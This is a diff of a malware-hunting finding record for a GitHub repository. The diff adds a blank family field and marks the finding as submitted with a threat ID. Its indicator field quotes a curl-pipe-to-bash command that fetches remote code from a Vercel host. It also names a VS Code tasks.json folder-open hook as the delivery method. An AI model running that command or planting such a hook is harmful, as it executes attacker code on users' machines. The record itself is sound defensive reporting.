@@ -2,6 +2,7 @@
   "finding": {
     "key": "repository:dawit212119/wetruck",
     "kind": "repository",
+    "family": "",
     "id": "dawit212119/wetruck",
     "url": "https://github.com/Dawit212119/wetruck",
     "registry": "github",
@@ -18,8 +19,8 @@
     "iocs": "default-configuration-sandy.vercel.app; https://default-configuration-sandy.vercel.app/settings/linux?flag=9-test; curl https://default-configuration-sandy.vercel.app/settings/linux?flag=9-test | bash; src/.vscode/tasks.json",
     "matched_signatures": "settings/linux?flag=; settings/win?flag=; folderOpen curl filename:tasks.json",
     "reasons": "Shares a confirmed-malware code signature ['settings/linux?flag=', 'settings/win?flag=', 'folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 5)",
-    "osm_status": "not_submitted",
-    "osm_threat_id": "",
+    "osm_status": "submitted",
+    "osm_threat_id": "a4a3192a-6f8c-4540-9308-d8cc013b2b6c",
     "first_seen": "hunt-20260928T024937Z",
     "last_seen": "hunt-20260928T024937Z",
     "evidence_file": "repositories/dawit212119_wetruck.json",
